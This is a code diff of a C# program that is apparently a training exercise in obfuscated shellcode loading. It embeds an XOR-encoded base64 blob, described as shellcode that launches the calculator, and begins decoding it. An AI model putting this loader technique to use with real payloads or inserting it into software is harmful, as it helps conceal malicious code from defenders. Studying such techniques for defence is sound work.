@@ -1,7 +1,7 @@
 using System;
 using System.Runtime.InteropServices;
 
-namespace A03_4_ObfuscatedLoader
+namespace A03_4_obfuscated_loader
 {
     class Program
     {
@@ -27,7 +27,7 @@ namespace A03_4_ObfuscatedLoader
         {
             // 1. The Obfuscated Data (XOR 0x5A)
             // This string represents the exact 138 bytes of the calc shellcode.
-            string embeddedBlob = "SINK7CgoSDE99mXoSL92GBhIvzAwSDE2SDE2SDEuEIs9PChIAeiLgIgAAABIAnrkRIuYGBRIu2ggSUEB7USLeCRIUQHtRIt4HBRIAe1I/+xD9zylBaU0IiwSHeEBIAnowSAdIAnrwSAnIEAABIAnoski9mXoRUi7amNhbGMuZXhlUkiJ4boBAAAAf9BIg8REOMM=";
+            string embeddedBlob = "Etm2chJrrD8S0Sw6EtEsQhLRLGoS0WwS0WwS0TRK0R9mEluy0drSWlpaEluyHtE6Qh7RMnoTW7ce0Sp+E1u0HtEiRhNbtROllhnRJv9aElu1EuINMzQfIj85WhJjXS+8GVXtXjwb0V7dEluyEmuTCxLgOTs2OXQ/Ij8IEtO74FtaWlqlihLZnmKZ";
 
             byte[] encoded = Convert.FromBase64String(embeddedBlob);
             byte[] decoded = new byte[encoded.Length];
